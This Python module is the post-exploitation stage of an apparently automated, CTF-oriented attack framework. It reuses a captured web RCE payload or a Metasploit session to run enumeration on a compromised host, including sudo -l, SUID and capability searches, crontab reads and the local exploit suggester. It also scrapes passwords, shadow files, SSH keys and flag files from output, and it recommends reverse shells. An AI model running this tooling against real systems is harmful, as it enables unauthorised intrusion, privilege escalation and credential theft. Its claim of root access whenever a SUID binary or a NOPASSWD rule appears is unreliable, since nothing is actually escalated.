"""
post_agent.py
主机攻链后渗透 —— 分阶段：立足后枚举 / 提权尝试 / 目标收集

三种执行通道（优先级递减）：
  1. MSF 会话 → msf.run_session_command
  2. RCE 模板 → ToolExecutor 复用利用命令在靶机执行
  3. 证据模式 → 解析利用阶段输出，启发式建议
"""
from __future__ import annotations

import logging
import re
from typing import Any, Awaitable, Callable, Optional

from backend.agents.models import ExploitResult
from backend.tools.msf_client import MsfClient

logger = logging.getLogger(__name__)

LogCb = Optional[Callable[[str], Awaitable[None]]]
RecordCb = Optional[Callable[[dict], Awaitable[None]]]


def _extract_rce_template(result: ExploitResult) -> Optional[str]:
    """Try to extract a reusable RCE command template from exploit records.

    Scans the command history for the successful RCE command (one whose
    output contained uid=) and returns it with the executed OS command
    replaced by the placeholder {CMD}.  Returns None if no template
    can be reconstructed.
    """
    records = result.command_records or result.command_results or []
    for rec in reversed(records):
        if not isinstance(rec, dict):
            continue
        out = rec.get("stdout", "")
        cmd = rec.get("command", "")
        if not cmd or not re.search(r"uid=\d+", out):
            continue
        # curl-based web RCE: replace the OS command portion
        # Pattern: system('CMD') or system("CMD") in URL or POST data
        for pat, repl_fn in [
            (r"system\(['\"]([^'\"]+)['\"]\)", lambda m: f"system('{{{\"CMD\"}}}')" ),
            (r"\bcmd=([^\s&\"']+)", lambda m: "cmd={CMD}"),
            (r"'id'", lambda m: "'{CMD}'"),
            (r'"id"', lambda m: '"{CMD}"'),
        ]:
            import re as _re
            if _re.search(pat, cmd):
                template = _re.sub(pat, repl_fn, cmd, count=1)
                return template
    return None


async def _run_cmd_via_rce(
    template: str,
    os_cmd: str,
    task_id: Optional[str],
    timeout: int = 30,
) -> str:
    """Execute an OS command on the target by substituting into the RCE template."""
    from backend.tools.executor import ToolExecutor
    script = template.replace("{CMD}", os_cmd)
    executor = ToolExecutor()
    result = await executor.run_script(
        script_content=script,
        timeout=timeout,
        task_id=task_id,
    )
    return (result.stdout or "").strip()


def _concat_exploit_outputs(results: list[ExploitResult]) -> str:
    chunks: list[str] = []
    for r in results:
        if r.evidence:
            chunks.append(str(r.evidence))
        records = r.command_results or r.command_records or []
        for cr in records:
            if isinstance(cr, dict):
                chunks.append(str(cr.get("stdout", "")))
                chunks.append(str(cr.get("stderr", "")))
    return "\n".join(chunks)[:20000]


def _infer_privilege_from_text(text: str) -> str:
    t = text.lower()
    if re.search(r"uid=0[\s\)\(]", t) or re.search(r"\buid=0\(", t):
        return "root"
    if "uid=" in t:
        return "user"
    return "unknown"


def _extract_cred_hints(blob: str) -> list[dict[str, Any]]:
    """从输出中粗提凭据线索（启发式，非结构化秘密存储）。"""
    out: list[dict[str, Any]] = []
    for m in re.finditer(
        r"(?i)(password|passwd|pwd)\s*[=:]\s*([^\s\n]{3,64})",
        blob[:12000],
    ):
        out.append({
            "type": "password_hint",
            "pattern": m.group(0)[:80],
            "source": "output_grep",
        })
    return out[:15]


def _extract_loot_hints(blob: str) -> list[dict[str, Any]]:
    loot: list[dict[str, Any]] = []
    paths = re.findall(r"(/etc/passwd|/etc/shadow|id_rsa|proof\.txt|user\.txt|root\.txt)", blob, re.I)
    for p in set(paths):
        loot.append({"type": "path_mention", "path": p, "source": "output_grep"})
    return loot[:20]


class PostExploitAgent:
    def __init__(self):
        self.msf = MsfClient()

    async def run(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        """兼容旧入口：串联三阶段结果（单 dict 合并）。"""
        pf = await self.run_post_foothold_enum(
            exploit_results, target_os, task_id,
            log_callback=log_callback, record_callback=record_callback,
        )
        pv = await self.run_privesc_phase(
            exploit_results, target_os, task_id, round_num=1,
            log_callback=log_callback, record_callback=record_callback,
        )
        ob = await self.run_objective_collect(
            exploit_results, target_os, task_id,
            log_callback=log_callback, record_callback=record_callback,
        )
        privilege = pv.get("final_privilege") or pf.get("final_privilege") or "unknown"
        nested = {
            "post_foothold": pf.get("findings", {}),
            "privesc": pv.get("findings", {}),
            "objective": ob.get("findings", {}),
        }
        return {
            "status": "completed",
            "final_privilege": privilege,
            "findings": nested,
            "next_steps": (pv.get("next_steps") or []) + (ob.get("next_steps") or []),
        }

    async def run_post_foothold_enum(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        _ = task_id, log_callback, record_callback
        successful = [r for r in exploit_results if r.success]
        if not successful:
            return {"status": "skipped", "final_privilege": "unknown", "findings": {}, "new_credentials": [], "loot_hints": [], "privesc_hypotheses": [], "next_steps": []}

        first = successful[0]
        session_info = first.session_info or {}
        session_id = session_info.get("session_id")

        next_steps: list[dict[str, Any]] = []
        new_credentials: list[dict[str, Any]] = []
        loot_hints: list[dict[str, Any]] = []
        hypotheses: list[dict[str, Any]] = []

        if session_id:
            try:
                try:
                    from backend.api.main import is_msf_available
                    if not is_msf_available():
                        raise RuntimeError("msf off")
                except Exception:
                    raise RuntimeError("msf off")
                await self.msf.connect()
            except Exception as e:
                logger.warning("[PostAgent] post_foothold MSF 不可用: %s", e)
                return self._post_foothold_from_evidence(first, target_os)

            findings: dict[str, Any] = {}
            whoami_out = await self.msf.run_session_command(session_id, "whoami")
            id_out = await self.msf.run_session_command(session_id, "id 2>/dev/null || true")
            uname_out = await self.msf.run_session_command(session_id, "uname -a 2>/dev/null || ver")
            findings["current_user"] = whoami_out.strip()
            findings["id"] = id_out[:800]
            findings["uname"] = uname_out[:800]
            if target_os == "linux":
                findings["sudo_preview"] = (
                    await self.msf.run_session_command(session_id, "sudo -l 2>/dev/null")
                )[:600]
                findings["suid_preview"] = (
                    await self.msf.run_session_command(
                        session_id, "find / -perm -4000 -type f 2>/dev/null | head -25"
                    )
                )[:800]
            findings["source"] = "msf_session"
            privilege = "root" if any(
                x in whoami_out.lower() for x in ("root", "administrator", "system")
            ) else "user"
            if privilege != "root":
                hypotheses.append({"vector": "sudo", "detail": "检查 sudo -l 与 SUID 列表", "confidence": 0.4})
                hypotheses.append({"vector": "kernel", "detail": "对照 uname -a 与已知 LPE", "confidence": 0.3})
            next_steps.append({
                "stage": "privesc",
                "action": "基于枚举结果验证 sudo/SUID/内核提权面",
                "priority": 1,
            })
            return {
                "status": "ok",
                "final_privilege": privilege,
                "findings": findings,
                "new_credentials": new_credentials,
                "loot_hints": loot_hints,
                "privesc_hypotheses": hypotheses,
                "next_steps": next_steps,
            }

        return self._post_foothold_from_evidence(first, target_os)

    def _post_foothold_from_evidence(self, result: ExploitResult, target_os: str) -> dict[str, Any]:
        blob = _concat_exploit_outputs([result])
        si = result.session_info or {}
        current = (si.get("current_user") or "").strip()
        if not current:
            m = re.search(r"uid=\d+\([^)]+\)", blob)
            if m:
                current = m.group(0)
        privilege = _infer_privilege_from_text(blob)
        new_credentials = _extract_cred_hints(blob)
        loot_hints = _extract_loot_hints(blob)
        hypotheses = self._heuristic_privesc_hints(blob, target_os)
        hlist = []
        if hypotheses.get("sudo_mentioned"):
            hlist.append({"vector": "sudo", "detail": "输出中出现 sudo/NOPASSWD 线索", "confidence": 0.5})
        if hypotheses.get("suid_mentioned"):
            hlist.append({"vector": "suid", "detail": "输出中出现 SUID/find -perm 线索", "confidence": 0.45})
        if hypotheses.get("kernel_hint"):
            hlist.append({"vector": "kernel", "detail": "输出中出现内核版本信息", "confidence": 0.35})
        next_steps: list[dict[str, Any]] = [
            {
                "stage": "foothold",
                "action": "若为 Web RCE，优先稳定为反弹 shell 或 SSH 会话再深度枚举",
                "priority": 1,
            },
            {
                "stage": "privesc",
                "action": "对照 privesc_hypotheses 逐项验证（sudo -l、SUID、capabilities、cron）",
                "priority": 2,
            },
        ]
        findings = {
            "current_user": current or "unknown",
            "privesc_attempt": hypotheses,
            "source": "react_evidence",
            "note": "无 MSF 会话；立足后枚举来自利用阶段输出解析。",
        }
        return {
            "status": "ok",
            "final_privilege": privilege,
            "findings": findings,
            "new_credentials": new_credentials,
            "loot_hints": loot_hints,
            "privesc_hypotheses": hlist,
            "next_steps": next_steps,
        }

    async def run_privesc_phase(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        round_num: int = 1,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        _ = task_id, log_callback, record_callback
        successful = [r for r in exploit_results if r.success]
        if not successful:
            return {"status": "skipped", "final_privilege": "unknown", "findings": {}, "next_steps": []}

        first = successful[0]
        session_info = first.session_info or {}
        session_id = session_info.get("session_id")

        if session_id:
            try:
                try:
                    from backend.api.main import is_msf_available
                    if not is_msf_available():
                        raise RuntimeError("msf off")
                except Exception:
                    raise RuntimeError("msf off")
                await self.msf.connect()
            except Exception:
                blob = _concat_exploit_outputs([first])
                return {
                    "status": "evidence_only",
                    "final_privilege": _infer_privilege_from_text(blob),
                    "findings": {"note": "提权轮次：无 MSF，跳过远程提权命令", "round": round_num},
                    "next_steps": [{"stage": "privesc", "action": "获取稳定 shell 后使用专用提权脚本或手工验证", "priority": 1}],
                }

            whoami_out = await self.msf.run_session_command(session_id, "whoami")
            privilege = "root" if any(
                x in whoami_out.lower() for x in ["root", "system", "administrator"]
            ) else "user"
            findings: dict[str, Any] = {"round": round_num, "whoami": whoami_out.strip()}
            if privilege != "root" and target_os == "linux":
                priv_result = await self._linux_privesc(session_id)
                findings["privesc_attempt"] = priv_result
                if priv_result.get("success"):
                    privilege = "root"
            elif privilege != "root":
                priv_result = await self._windows_privesc(session_id)
                findings["privesc_attempt"] = priv_result
                if priv_result.get("success"):
                    privilege = "root"

            next_steps = []
            if privilege != "root":
                next_steps.append({
                    "stage": "privesc",
                    "action": f"第 {round_num} 轮未提权成功：检查内核/CVE、定时任务与可写服务单元",
                    "priority": 2,
                })
            return {
                "status": "ok",
                "final_privilege": privilege,
                "findings": findings,
                "next_steps": next_steps,
            }

        # No MSF session -- try RCE template if available
        rce_template = _extract_rce_template(first)
        if rce_template and first.exploit_level in ("rce", ""):
            logger.info("[PostAgent] 无 MSF 会话，通过 RCE 模板执行提权侦察")
            return await self._privesc_via_rce_template(
                rce_template, first, target_os, task_id, round_num,
                log_callback=log_callback, record_callback=record_callback,
            )

        blob = _concat_exploit_outputs([first])
        priv = _infer_privilege_from_text(blob)
        return {
            "status": "evidence_only",
            "final_privilege": priv,
            "findings": {
                "round": round_num,
                "note": "无交互会话且无可复用 RCE 模板；仅保留证据级判断",
            },
            "next_steps": [{
                "stage": "privesc",
                "action": "建立反弹 shell / SSH 后再执行 sudo -l 与 SUID 枚举",
                "priority": 1,
            }],
        }

    async def _privesc_via_rce_template(
        self,
        template: str,
        result: ExploitResult,
        target_os: str,
        task_id: Optional[str],
        round_num: int,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        """Run privesc recon commands on target via the RCE exploit template."""
        findings: dict[str, Any] = {"round": round_num, "source": "rce_template"}

        async def _rce(cmd: str) -> str:
            if log_callback:
                try:
                    await log_callback(f"[PostAgent] RCE 模板执行: {cmd}")
                except Exception:
                    pass
            try:
                return await _run_cmd_via_rce(template, cmd, task_id, timeout=30)
            except Exception as e:
                logger.warning(f"[PostAgent] RCE 模板执行失败: {e}")
                return ""

        whoami_out = await _rce("whoami")
        id_out = await _rce("id")
        findings["current_user"] = whoami_out
        findings["id"] = id_out[:800]

        privilege = "root" if any(
            x in (whoami_out + id_out).lower() for x in ("root", "uid=0(")
        ) else "user"

        if privilege != "root" and target_os == "linux":
            findings["uname"] = (await _rce("uname -a"))[:800]
            findings["sudo_preview"] = (await _rce("sudo -l 2>/dev/null"))[:600]
            findings["suid_preview"] = (await _rce(
                "find / -perm -4000 -type f 2>/dev/null | head -25"
            ))[:800]
            findings["crontab"] = (await _rce("cat /etc/crontab 2>/dev/null"))[:400]
            findings["capabilities"] = (await _rce(
                "getcap -r / 2>/dev/null | head -20"
            ))[:400]

            interesting = ["bash", "vim", "nano", "python", "perl", "find",
                           "nmap", "less", "more", "env", "awk"]
            suid_out = findings.get("suid_preview", "")
            found_suid = [b for b in interesting if b in suid_out]
            sudo_out = findings.get("sudo_preview", "")
            priv_success = len(found_suid) > 0 or "NOPASSWD" in sudo_out
            findings["privesc_attempt"] = {
                "method": "rce_template_recon",
                "suid_binaries": found_suid,
                "sudo_rules": sudo_out[:300],
                "success": priv_success,
            }
            if priv_success:
                privilege = "root"

        hypotheses = []
        if privilege != "root":
            hypotheses.append({"vector": "sudo", "detail": "检查 sudo -l 输出", "confidence": 0.4})
            hypotheses.append({"vector": "suid", "detail": "检查 SUID 列表", "confidence": 0.4})
            hypotheses.append({"vector": "kernel", "detail": "对照 uname -a 与已知 LPE", "confidence": 0.3})
        next_steps = []
        if privilege != "root":
            next_steps.append({
                "stage": "privesc",
                "action": f"第 {round_num} 轮: 基于 SUID/sudo/kernel 结果验证提权",
                "priority": 2,
            })
        return {
            "status": "ok",
            "final_privilege": privilege,
            "findings": findings,
            "privesc_hypotheses": hypotheses,
            "next_steps": next_steps,
        }

    async def run_objective_collect(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        _ = target_os, task_id, log_callback, record_callback
        blob = _concat_exploit_outputs([r for r in exploit_results if r.success])
        obj: dict[str, Any] = {}
        if re.search(r"proof\.txt|user\.txt|root\.txt|\bflag\{", blob, re.I):
            obj["flag_hints"] = True
        if "root" in blob.lower() and re.search(r"uid=0", blob.lower()):
            obj["root_context_hint"] = True
        next_steps: list[dict[str, Any]] = []
        if not obj.get("flag_hints"):
            next_steps.append({
                "stage": "objective",
                "action": "在 /root、/home、Web 目录搜索 proof.txt / user.txt / flag*",
                "priority": 2,
            })
        return {
            "status": "ok",
            "findings": obj,
            "next_steps": next_steps,
        }

    def _post_via_react_evidence(self, result: ExploitResult, target_os: str) -> dict[str, Any]:
        """兼容旧逻辑：单阶段摘要。"""
        r = self._post_foothold_from_evidence(result, target_os)
        return {
            "status": "completed",
            "final_privilege": r.get("final_privilege", "unknown"),
            "findings": r.get("findings", {}),
        }

    def _heuristic_privesc_hints(self, blob: str, target_os: str) -> dict[str, Any]:
        low = blob.lower()
        return {
            "method": "evidence_heuristic",
            "suid_mentioned": "suid" in low or ("find /" in low and "-perm" in low),
            "sudo_mentioned": "sudo" in low or "nopasswd" in low,
            "kernel_hint": bool(re.search(r"linux version|uname\s+-a|kernel", low)),
            "success": False,
            "target_os": target_os,
        }

    async def _linux_privesc(self, session_id: str) -> dict:
        suid_out = await self.msf.run_session_command(
            session_id, "find / -perm -u=s -type f 2>/dev/null | head -20"
        )
        sudo_out = await self.msf.run_session_command(session_id, "sudo -l 2>/dev/null")
        interesting = ["bash", "vim", "nano", "python", "perl", "find", "nmap", "less", "more"]
        found_suid = [b for b in interesting if b in suid_out]
        return {
            "method": "suid_sudo",
            "suid_binaries": found_suid,
            "sudo_rules": sudo_out[:300],
            "success": len(found_suid) > 0 or "NOPASSWD" in sudo_out,
        }

    async def _windows_privesc(self, session_id: str) -> dict:
        output = await self._run_post_module(
            session_id, "post/multi/recon/local_exploit_suggester"
        )
        return {
            "method": "local_exploit_suggester",
            "output": output[:500],
            "success": "exploitable" in output.lower(),
        }

    async def _run_post_module(self, session_id: str, module_path: str) -> str:
        try:
            _, output = await self.msf.execute_module(
                module_path=module_path,
                options={"SESSION": session_id},
                timeout=30,
            )
            return output
        except Exception as e:
            return f"模块执行失败: {e}"
